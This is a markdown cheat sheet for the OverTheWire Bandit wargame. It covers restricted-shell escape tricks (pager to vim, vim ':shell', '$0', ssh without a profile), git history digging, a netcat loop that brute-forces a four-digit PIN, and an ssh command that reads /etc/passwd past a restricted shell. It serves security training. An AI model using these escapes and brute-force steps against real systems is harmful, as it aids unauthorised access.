# Bandit Tricks

Shell escapes, git archaeology, SSH tricks from OverTheWire Bandit.

---

## Shell Escape Techniques

| Situation | Technique |
|:---:|:---:|
| Stuck in `more` | Make terminal tiny -> `more` enters pager -> press `v` to open vim |
| Inside vim | `:set shell=/bin/bash` then `:shell` |
| Uppercase-only shell (bandit32) | `$0` invokes the current shell interpreter |
| SSH kicks out immediately | `ssh user@host -t bash --noprofile` |
| `.bashrc` runs exit | Pass command directly: `ssh user@host cat readme` |

---

## Git Archaeology

```bash
# clone over SSH with custom port
git clone ssh://user@host:2220/repo /tmp/repo

# view history
git log
git log --oneline

# inspect a specific commit
git show <hash>

# check all branches
git branch -a
git checkout <branch>

# list tags
git tag
git show <tagname>

# force-add a file ignored by .gitignore (bandit31)
echo "text" > key.txt
git add -f key.txt
git commit -m "add"
git push
```

---

## Useful One-liners

```bash
# find unique line in file (bandit8)
sort data.txt | uniq -u

# find human-readable strings in binary (bandit9)
strings data | grep "=="

# reproduce cron script hash (bandit22)
echo "I am user bandit23" | md5sum | cut -d ' ' -f 1

# diff two files
diff file1 file2

# brute-force PIN with bash (bandit24)
for i in $(seq 0 9999); do
  printf "%04d\n" $i
done | nc localhost 30002 > /tmp/output.txt
```

---

## SSH Tricks

```bash
# login with private key
ssh -i id_rsa user@host -p 2220

# execute command without interactive shell (bypass restricted shell)
ssh user@host -p 2220 cat /etc/passwd

# check what shell a user runs
grep <user> /etc/passwd
```
